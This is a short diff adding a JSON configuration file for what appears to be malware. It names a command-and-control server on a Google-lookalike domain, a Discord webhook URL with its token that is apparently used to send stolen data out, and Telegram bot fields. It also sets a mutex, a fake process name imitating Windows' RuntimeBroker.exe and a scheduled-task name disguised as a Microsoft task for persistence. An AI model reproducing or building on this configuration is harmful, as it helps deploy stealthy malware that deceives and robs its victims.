@@ -1,0 +1,15 @@
+{
+  "platform": "apk",
+  "c2_url": "https://googleaccountverify.com",
+  "tg_token": "",
+  "tg_chat": "",
+  "webhook": "https://discord.com/api/webhooks/1555246711926947952/VX1RH19iwNtuX4FAOrkqPD0aHHUA_ySu45Ryfa0KFpLtFSpCVn0ZLeTI5isa6pJvt7ED",
+  "secret_key": "lok_lizard_locksmiths_est_2024",
+  "rounds": 8,
+  "c2_port": 8080,
+  "test_mode": "test",
+  "mutex_name": "Global\\FSOCIETY_MUTEX_0X99",
+  "fake_exe": "RuntimeBroker.exe",
+  "task_name": "Microsoft\\Windows\\Wininet\\CacheTask",
+  "heartbeat": 5
+}
